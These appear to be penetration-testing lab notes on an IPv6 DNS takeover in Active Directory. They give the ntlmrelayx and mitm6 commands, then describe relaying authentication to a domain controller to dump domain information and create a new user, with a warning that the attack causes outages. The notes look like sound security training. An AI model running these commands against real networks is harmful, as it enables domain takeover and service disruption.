## IPv6 DNS Takeover via mitm6

### Run mitm6
- `ntlmrelayx.py -6 -t ldaps://<DC IP> -wh fakewpad.marvel.loacl -l lootme`
- `sudo mitm6 -d <domain>`
- IP addresses start to get assigned
- We are now the MITM for IPv6 for these servers
- When an event occurs on the network (e.g. machine reboot, logging in) we can relay it
- Reboot workstation
- **Important**: Only run in small sprints, do not run this and walk away, can and will cause outages in a network. No longer than 5-10 minutes.

  ![image](https://github.com/user-attachments/assets/b9d336b9-9b2f-475d-91ae-4bbe3120a7a4)

- Succeeded because it authenticated to the domain on the DC!
- A lot of info in lootme

  ![image](https://github.com/user-attachments/assets/8c8825fc-d4cc-4b22-adf2-50abf019d225)

- Log onto domain as Administrator

  ![image](https://github.com/user-attachments/assets/26f73b1f-0847-41cd-8bb9-04e31a9b6fff)

- Now it creates access control lists and a new user

  ![image](https://github.com/user-attachments/assets/3bee7fa3-3ee8-4026-a7b8-f767905e3465)

- Game over
